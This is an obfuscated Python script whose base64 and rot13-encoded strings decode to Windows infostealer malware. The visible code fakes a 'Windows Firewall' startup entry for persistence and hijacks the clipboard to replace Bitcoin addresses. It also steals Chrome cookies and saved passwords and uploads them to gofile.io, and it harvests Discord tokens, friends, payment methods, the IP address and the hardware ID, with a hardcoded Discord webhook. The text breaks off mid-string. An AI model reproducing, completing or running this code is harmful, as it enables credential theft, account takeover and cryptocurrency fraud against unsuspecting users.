
import base64, codecs
magic = 'aW1wb3J0IG9zDQppZiBvcy5uYW1lID09ICJudCI6DQogICAgcGFzcw0KZWxzZToNCiAgICBleGl0KCkNCmZyb20ganNvbiBpbXBvcnQgbG9hZHMsIGR1bXBzDQpmcm9tIHJlIGltcG9ydCBmaW5kYWxsDQpmcm9tIHVybGxpYi5yZXF1ZXN0IGltcG9ydCBSZXF1ZXN0LCB1cmxvcGVuDQpmcm9tIHdpbnJlZ2lzdHJ5IGltcG9ydCBXaW5SZWdpc3RyeSBhcyBSZWcNCmZyb20gc3VicHJvY2VzcyBpbXBvcnQgUG9wZW4sIFBJUEUNCmltcG9ydCB3aW4zMmFwaQ0KaW1wb3J0IHdpbjMyY29uDQppbXBvcnQgcmFuZG9tDQpmcm9tIFBJTCBpbXBvcnQgSW1hZ2VHcmFiDQppbXBvcnQgY3R5cGVzDQppbXBvcnQgc3lzDQppbXBvcnQgZ2V0cGFzcw0KaW1wb3J0IHJlDQppbXBvcnQgcmVxdWVzdHMNCmltcG9ydCBzdWJwcm9jZXNzDQpmcm9tIG9zIGltcG9ydCBlbnZpcm9uLCBwYXRoDQpmcm9tIHdpbjMyY3J5cHQgaW1wb3J0IENyeXB0VW5wcm90ZWN0RGF0YQ0KaW1wb3J0IGpzb24NCmltcG9ydCBiYXNlNjQNCmltcG9ydCBzcWxpdGUzDQppbXBvcnQgYnJvd3Nlcl9jb29raWUzDQppbXBvcnQgdGltZQ0KaW1wb3J0IGxvZ2dpbmcNCmltcG9ydCB3aW4zMmNyeXB0DQpmcm9tIENyeXB0by5DaXBoZXIgaW1wb3J0IEFFUw0KaW1wb3J0IHNodXRpbA0KZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUsIHRpbWVkZWx0YQ0KZnJvbSBiYXNlNjQgaW1wb3J0IGI2NGRlY29kZQ0KDQojIENvbmZpZ3VyYXRpb24NCkJUQ19BRERSRVNTID0gJzNMc1pIN0xxeEpNWkJhVlU5WW9UTGs4SE5uVWNtekU4OHYnDQpwYXN0ZWJpbiA9ICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvUEJ1N0hpVXEiDQpoaWRkZW5XaW5kb3cgPSBUcnVlDQpGYWtlRmlsZU5hbWUgPSAiV2luZG93cyBGaXJld2FsbCINCndlYmhvb2tVUkwgPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODU2OTkzNjE0OTI0MDg3MzQ3Lzg3WE5wMkhFYUktVmdXTVRnN2xWdVhodWl3T0dJUWVxa1llY255NzVIVTRxUkd0SE1NOHhEaGZoekVkSWdzSDNCdDM4Ig0KcGF0aCA9IHBhdGguam9pbigNCiAgICBlbnZpcm9uWyJVU0VSUFJPRklMRSJdLA0KICAgICJBcHBEYXRhIiwNCiAgICAiTG9jYWwiLA0KICAgICJHb29nbGUiLA0KICAgICJDaHJvbWUiLA0KICAgICJVc2VyIERhdGEiLA0KICAgICJEZWZhdWx0IiwNCiAgICAiTG9naW4gRGF0YSIsDQopDQpteW5hbWUgPSBzdHIoc3lzLmFyZ3ZbMF0pDQpVU0VSX05BTUUgPSBnZXRwYXNzLmdldHVzZXIoKQ0KTE9DQUwgPSBvcy5nZXRlbnYoIkxPQ0FMQVBQREFUQSIpDQpST0FNSU5HID0gb3MuZ2V0ZW52KCJBUFBEQVRBIikNClBBVEhTID0gew0KICAgICJEaXNjb3JkIiAgICAgICAgICAgOiBST0FNSU5HICsgIlxcRGlzY29yZCIsDQogICAgIkRpc2NvcmQgQ2FuYXJ5IiAgICA6IFJPQU1JTkcgKyAiXFxkaXNjb3JkY2FuYXJ5IiwNCiAgICAiRGlzY29yZCBQVEIiICAgICAgIDogUk9BTUlORyArICJcXGRpc2NvcmRwdGIiLA0KICAgICJHb29nbGUgQ2hyb21lIiAgICAgOiBMT0NBTCArICJcXEdvb2dsZVxcQ2hyb21lXFxVc2VyIERhdGFcXERlZmF1bHQiLA0KICAgICJCcmF2ZSIgICAgICAgICAgICAgOiBMT0NBTCArICJcXEJyYXZlU29mdHdhcmVcXEJyYXZlLUJyb3dzZXJcXFVzZXIgRGF0YVxcRGVmYXVsdCIsDQogICAgIllhbmRleCIgICAgICAgICAgICA6IExPQ0FMICsgIlxcWWFuZGV4XFxZYW5kZXhCcm93c2VyXFxVc2VyIERhdGFcXERlZmF1bHQiDQp9DQoNCmNsYXNzIENsaXBib2FyZDoNCiAgICBkZWYgX19pbml0X18oc2VsZik6DQogICAgICAgIHNlbGYua2VybmVsMzIgPSBjdHlwZXMud2luZGxsLmtlcm5lbDMyDQogICAgICAgIHNlbGYua2VybmVsMzIuR2xvYmFsTG9jay5hcmd0eXBlcyA9IFtjdHlwZXMuY192b2lkX3BdDQogICAgICAgIHNlbGYua2VybmVsMzIuR2xvYmFsTG9jay5yZXN0eXBlID0gY3R5cGVzLmNfdm9pZF9wDQogICAgICAgIHNlbGYua2VybmVsMzIuR2xvYmFsVW5sb2NrLmFyZ3R5cGVzID0gW2N0eXBlcy5jX3ZvaWRfcF0NCg0KICAgICAgICBzZWxmLnVzZXIzMiA9IGN0eXBlcy53aW5kbGwudXNlcjMyDQogICAgICAgIHNlbGYudXNlcjMyLkdldENsaXBib2FyZERhdGEucmVzdHlwZSA9IGN0eXBlcy5jX3ZvaWRfcA0KDQogICAgZGVmIF9fZW50ZXJfXyhzZWxmKToNCiAgICAgICAgc2VsZi51c2VyMzIuT3BlbkNsaXBib2FyZCgwKQ0KICAgICAgICBpZiBzZWxmLnVzZXIzMi5Jc0NsaXBib2FyZEZvcm1hdEF2YWlsYWJsZSgxKToNCiAgICAgICAgICAgIGRhdGEgID0gc2VsZi51c2VyMzIuR2V0Q2xpcGJvYXJkRGF0YSgxKQ0KICAgICAgICAgICAgZGF0YV9sb2NrZWQgPSBzZWxmLmtlcm5lbDMyLkdsb2JhbExvY2soZGF0YSkNCiAgICAgICAgICAgIHRleHQgPSBjdHlwZXMuY19jaGFyX3AoZGF0YV9sb2NrZWQpDQogICAgICAgICAgICB2YWx1ZSA9IHRleHQudmFsdWUNCiAgICAgICAgICAgIHNlbGYua2VybmVsMzIuR2xvYmFsVW5sb2NrKGRhdGFfbG9ja2VkKQ0KDQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgcmV0dXJuIHZhbHVlLmRlY29kZSgpDQoNCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgICAgICAgICByZXR1cm4gJycNCg0KICAgIGRlZiBfX2V4aXRfXyhzZWxmLCBleGNfdHlwZSwgZXhjX3ZhbHVlLCBleGNfdHJhY2ViYWNrKToNCiAgICAgICAgc2VsZi51c2VyMzIuQ2xvc2VDbGlwYm9hcmQoKQ0KDQpjbGFzcyBNZXRob2RzOg0KICAgIHJlZ2V4ID0gJ14oYmMxfFsxM10pW2EtekEtSEotTlAtWjAtOV0rJw0KDQogICAgQHN0YXRpY21ldGhvZA0KICAgIGRlZiBzZXRfY2xpcGJvYXJkKHRleHQpOg0KICAgICAgICByZXR1cm4gc3VicHJvY2Vzcy5jaGVja19jYWxsKCdlY2hvICVzIHxjbGlwJyAlIHRleHQuc3RyaXAoKSAsIHNoZWxsPVRydWUpDQoNCiAgICBkZWYgY2hlY2soc2VsZiwgdGV4dCk6DQogICAgICAgIHRyeToNCiAgICAgICAgICAgIHJlZ2V4X2NoZWNrID0gcmUuZmluZGFsbChzZWxmLnJlZ2V4LCB0ZXh0KQ0KICAgICAgICAgICAgaWYgcmVnZXhfY2hlY2s6DQogICAgICAgICAgICAgICAgcmV0dXJuIFRydWUNCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICAgICAgcmV0dXJuIEZhbHNlDQoNCmNsYXNzIExvZ2dlcigpOg0KICAgIGRlZiBzdGFydHVwKCk6DQogICAgICAgIGlmICIucHkiIGluIG15bmFtZToNCiAgICAgICAgICAgIHJldHVybg0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgIHNodXRpbC5jb3B5MihteW5hbWUsIGZyJ0M6XFVzZXJzXCVzXEFwcERhdGFcUm9hbWluZ1xNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXBce0Zha2VGaWxlTmFtZX0uZXhlJyAlIFVTRVJfTkFNRSkNCiAgICAgICAgICAgICAgICBmaWxlX3BhdGggPSBteW5hbWUNCiAgICAgICAgICAgICAgICBpZiBmaWxlX3BhdGggPT0gIiI6DQogICAgICAgICAgICAgICAgICAgIGZpbGVfcGF0aCA9IG9zLnBhdGguZGlybmFtZShvcy5wYXRoLnJlYWxwYXRoKF9fZmlsZV9fKSkNCiAgICAgICAgICAgICAgICBiYXRfcGF0aCA9IHInQzpcVXNlcnNcJXNcQXBwRGF0YVxSb2FtaW5nXE1pY3Jvc29mdFxXaW5kb3dzXFN0YXJ0IE1lbnVcUHJvZ3JhbXNcU3RhcnR1cCcgJSBVU0VSX05BTUUNCiAgICAgICAgICAgICAgICB3aXRoIG9wZW4oYmF0X3BhdGggKyAnXFwnICsgZiJ7RmFrZUZpbGVOYW1lfS5iYXQiLCAidysiKSBhcyBiYXRfZmlsZToNCiAgICAgICAgICAgICAgICAgICAgYmF0X2ZpbGUud3JpdGUocidzdGFydCAiIiAlcycgJSBmaWxlX3BhdGgpDQogICAgICAgICAgICAgICAgICAgIHdpbjMyYXBpLlNldEZpbGVBdHRyaWJ1dGVzKGYie0Zha2VGaWxlTmFtZX0uYmF0Iiwgd2luMzJjb24uRklMRV9BVFRSSUJVVEVfSElEREVOKQ0KICAgICAgICAgICAgICAgICAgICBiYXRfZmlsZS5jbG9zZSgpDQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgICAgICAgICAgcHJpbnQoZSkNCiAgICBkZWYgY29va2llTG9nKCk6DQogICAgICAgIGNvb2tpZXMgPSBsaXN0KGJyb3dzZXJfY29va2llMy5jaHJvbWUoKSkNCiAgICAgICAgZiA9IG9wZW4oInJjLnR4dCIsIncrIikNCiAgICAgICAgd2luMzJhcGkuU2V0RmlsZUF0dHJpYnV0ZXMoInJjLnR4dCIsIHdpbjMyY29uLkZJTEVfQVRUUklCVVRFX0hJRERFTikNCiAgICAgICAgZm9yIGl0ZW0gaW4gY29va2llczoNCiAgICAgICAgICAgICAgICBmLndyaXRlKCIlc1xuIiAlIGl0ZW0pDQogICAgZGVmIHBhc3N3b3JkTG9nKCk6DQogICAgICAgIHRyeToNCiAgICAgICAgICAgIGRlZiBnZXRfbWFzdGVyX2tleSgpOg0KICAgICAgICAgICAgICAgIHdpdGggb3Blbihvcy5lbnZpcm9uWydVU0VSUFJPRklMRSddICsgb3Muc2VwICsgcidBcHBEYXRhXExvY2'
love = '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'
god = 'ICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgICAgICBwcmludChlKQ0KICAgICAgICAgICAgY29va2llc1VwbG9hZGVkID0gIkNvb2tpZXM6IE4vQSINCg0KICAgICAgICAjIFBhc3N3b3Jkcw0KICAgICAgICB0cnk6DQogICAgICAgICAgICBwYXNzd29yZHNSYXcgPSByZXF1ZXN0cy5wb3N0KCdodHRwczovL3N0b3JlOS5nb2ZpbGUuaW8vdXBsb2FkRmlsZScsIGZpbGVzPXsnZmlsZSc6ICgneHZjLnR4dCcsIG9wZW4oJ3h2Yy50eHQnLCAncmInKSksfSkudGV4dA0KICAgICAgICAgICAgcGFzc3dvcmRzVXBsb2FkZWQgPSBmIltQYXNzd29yZHNdKHtwYXNzd29yZHNSYXdbMzk6NjVdfSkiDQogICAgICAgICAgICBvcy5yZW1vdmUoInh2Yy50eHQiKQ0KICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6DQogICAgICAgICAgICBwcmludChlKQ0KICAgICAgICAgICAgcGFzc3dvcmRzVXBsb2FkZWQgPSAiUGFzc3dvcmRzOiBOL0EiDQoNCiAgICAgICAgIyBGaW5hbGl6ZSBMb2dnZXINCiAgICAgICAgZGVmIGdldGhlYWRlcnModG9rZW49Tm9uZSwgY29udGVudF90eXBlPSJhcHBsaWNhdGlvbi9qc29uIik6DQogICAgICAgICAgICBoZWFkZXJzID0gew0KICAgICAgICAgICAgICAgICJDb250ZW50LVR5cGUiOiBjb250ZW50X3R5cGUsDQogICAgICAgICAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMTEgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMjMuMC4xMjcxLjY0IFNhZmFyaS81MzcuMTEiDQogICAgICAgICAgICB9DQogICAgICAgICAgICBpZiB0b2tlbjoNCiAgICAgICAgICAgICAgICBoZWFkZXJzLnVwZGF0ZSh7IkF1dGhvcml6YXRpb24iOiB0b2tlbn0pDQogICAgICAgICAgICByZXR1cm4gaGVhZGVycw0KICAgICAgICBkZWYgZ2V0dXNlcmRhdGEodG9rZW4pOg0KICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgIHJldHVybiBsb2Fkcyh1cmxvcGVuKFJlcXVlc3QoImh0dHBzOi8vZGlzY29yZGFwcC5jb20vYXBpL3Y2L3VzZXJzL0BtZSIsIGhlYWRlcnM9Z2V0aGVhZGVycyh0b2tlbikpKS5yZWFkKCkuZGVjb2RlKCkpDQogICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgcGFzcw0KICAgICAgICBkZWYgZ2V0dG9rZW5zKHBhdGgpOg0KICAgICAgICAgICAgcGF0aCArPSAiXFxMb2NhbCBTdG9yYWdlXFxsZXZlbGRiIg0KICAgICAgICAgICAgdG9rZW5zID0gW10NCiAgICAgICAgICAgIGZvciBmaWxlX25hbWUgaW4gb3MubGlzdGRpcihwYXRoKToNCiAgICAgICAgICAgICAgICBpZiBub3QgZmlsZV9uYW1lLmVuZHN3aXRoKCIubG9nIikgYW5kIG5vdCBmaWxlX25hbWUuZW5kc3dpdGgoIi5sZGIiKToNCiAgICAgICAgICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZiJ7cGF0aH1cXHtmaWxlX25hbWV9IiwgZXJyb3JzPSJpZ25vcmUiKS5yZWFkbGluZXMoKSBpZiB4LnN0cmlwKCldOg0KICAgICAgICAgICAgICAgICAgICBmb3IgcmVnZXggaW4gKHIiW1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17Mjd9IiwgciJtZmFcLltcdy1dezg0fSIpOg0KICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHRva2VuIGluIGZpbmRhbGwocmVnZXgsIGxpbmUpOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRva2Vucy5hcHBlbmQodG9rZW4pDQogICAgICAgICAgICByZXR1cm4gdG9rZW5zDQogICAgICAgIGRlZiBnZXRpcCgpOg0KICAgICAgICAgICAgaXAgPSAiTm9uZSINCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICBpcCA9IHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9hcGkuaXBpZnkub3JnIikpLnJlYWQoKS5kZWNvZGUoKS5zdHJpcCgpDQogICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgcGFzcw0KICAgICAgICAgICAgcmV0dXJuIGlwDQogICAgICAgIGRlZiBnZXRhdmF0YXIodWlkLCBhaWQpOg0KICAgICAgICAgICAgdXJsID0gZiJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdmF0YXJzL3t1aWR9L3thaWR9LmdpZiINCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICB1cmxvcGVuKFJlcXVlc3QodXJsKSkNCiAgICAgICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgICAgICB1cmwgPSB1cmxbOi00XQ0KICAgICAgICAgICAgcmV0dXJuIHVybA0KICAgICAgICBkZWYgZ2V0aHdpZCgpOg0KICAgICAgICAgICAgcCA9IFBvcGVuKCJ3bWljIGNzcHJvZHVjdCBnZXQgdXVpZCIsIHNoZWxsPVRydWUsIHN0ZGluPVBJUEUsIHN0ZG91dD1QSVBFLCBzdGRlcnI9UElQRSkNCiAgICAgICAgICAgIHJldHVybiAocC5zdGRvdXQucmVhZCgpICsgcC5zdGRlcnIucmVhZCgpKS5kZWNvZGUoKS5zcGxpdCgiXG4iKVsxXQ0KICAgICAgICBkZWYgZ2V0ZnJpZW5kcyh0b2tlbik6DQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgcmV0dXJuIGxvYWRzKHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdjYvdXNlcnMvQG1lL3JlbGF0aW9uc2hpcHMiLCBoZWFkZXJzPWdldGhlYWRlcnModG9rZW4pKSkucmVhZCgpLmRlY29kZSgpKQ0KICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgIHBhc3MNCiAgICAgICAgZGVmIGdldGNoYXQodG9rZW4sIHVpZCk6DQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgcmV0dXJuIGxvYWRzKHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdjYvdXNlcnMvQG1lL2NoYW5uZWxzIiwgaGVhZGVycz1nZXRoZWFkZXJzKHRva2VuKSwgZGF0YT1kdW1wcyh7InJlY2lwaWVudF9pZCI6IHVpZH0pLmVuY29kZSgpKSkucmVhZCgpLmRlY29kZSgpKVsiaWQiXQ0KICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgIHBhc3MNCiAgICAgICAgZGVmIGhhc19wYXltZW50X21ldGhvZHModG9rZW4pOg0KICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgIHJldHVybiBib29sKGxlbihsb2Fkcyh1cmxvcGVuKFJlcXVlc3QoImh0dHBzOi8vZGlzY29yZGFwcC5jb20vYXBpL3Y2L3VzZXJzL0BtZS9iaWxsaW5nL3BheW1lbnQtc291cmNlcyIsIGhlYWRlcnM9